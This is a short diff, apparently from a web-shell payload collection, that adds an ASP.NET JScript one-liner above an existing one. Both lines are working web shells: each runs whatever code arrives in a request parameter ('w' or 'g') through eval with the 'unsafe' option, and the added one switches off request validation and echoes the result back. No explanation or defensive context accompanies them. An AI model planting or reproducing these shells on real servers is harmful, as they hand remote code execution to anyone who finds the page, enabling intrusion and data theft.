@@ -1,3 +1,7 @@
+<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+
+/*-------------------------------------------------------------------------*/ 
+
 <%@ Page Language="Jscript"%><%eval(Request.Item["g"],"unsafe");%>
 
 /*-------------------------------------------------------------------------*/ 
